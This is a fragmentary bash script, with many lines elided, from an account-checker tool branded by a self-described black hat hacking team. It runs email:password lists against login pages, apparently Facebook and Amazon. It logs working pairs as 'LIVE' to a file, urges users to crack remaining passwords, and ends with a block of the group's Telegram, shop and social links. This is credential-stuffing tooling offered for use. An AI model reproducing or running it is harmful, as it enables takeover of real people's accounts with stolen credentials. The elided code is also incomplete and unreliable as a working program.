...
dumper(){
  ...
  echo "please wait make sure the connection is fast and stable ..."
key=$(sed "s/ /+/g" <<< $word)
rm -rf .hasil
...
echo -e "${N}if you want to get straight to the results press CTRL + C / vol down + C\n"
rm -rf .0-$list
if [[ "$apel" = "y" ]]
then
   ...
   echo "$liste" | while read ver
    do 
      ...
      then
        ...
        get=$(echo $getf | grep -Po "<title>Log in Facebook | Facebook</title>")
      else
        if [[ "$amz" = "y" ]];then
        ...
        then
           ...
           then
              ...
              if echo "$get" | grep -Po "<title>Enter the Security Code</title>" >/dev/null
              then
                 echo -e "\x1b[0m${N}[${O} `date +%x | tr "/" "-"` ${N}]${O} Failed captcha => $email$del$pass ${N}|${O} Checked by hack4lx"
              else
                 echo "LIVE => $email$del$pass" >> $acc-$list.txt
                 echo -e "\x1b[0m${N}[${O} `date +%x | tr "/" "-"` ${N}] ${G}LIVE => $email$del$pass ${N}|${G} Acc $asu ${N}|${G} Checked by hack4lx"
              fi
           else
              echo -e "\x1b[0m${N}[${O} `date +%x | tr "/" "-"` ${N}] ${R}DIE => $email$del$pass ${N}|${R} Checked by hack4lx"
              echo "bad" >> .0-$list
           fi
        else
          if [[ "$get" = "" ]]
           then  
                if [[ "$hash" = "y" ]];then
                   ...
                   echo -e "\x1b[0m${N}[${O} `date +%x | tr "/" "-"` ${N}] ${R}DIE => ${R}$email$del$pass ${N}|${R} Checked by hack4lx"
...
if [[ "$hash" = "y" ]];then
   ...
   echo -e "${O}This is just an email checker, not an account checker, so it's different if Acc LIVE \ nbut you can't use the login, maybe it's just the wrong password or has been changed by the account owner \ nuse your brain to crack that password"
   echo -e "${G}- https://t.me/M4nifest0 :')${N}"
fi
}
echo -e "
...
case $d in
 ...
 ;;
 10) echo -e "
         |${G} hack4lx Checker CLI ${N}|

👊 M4nifest0 Black Hat Hacking Team™💪

📌 Explicit security team activity on social networks
📌 https://www.youtube.com/c/hack4lx
📌 https://www.instagram.com/_m4nifest0_
📌 https://github.com/M4nifest0
📌 https://twitter.com/_M4nifest0_
📌 https://t.me/M4nifest0
📌 https://t.me/M4nifest0_BIN_Database
📌 https://m4nifest0.com
📌 https://m4nifest0.shop
📌 https://m4nifest0.group
📌 https://dll.m4nifest0.com
Thx to:${O} hack4lx - M4nifest0${N}"
  ;;
   *) echo -e "[+] https://t.me/M4nifest0"
 ;;
esac
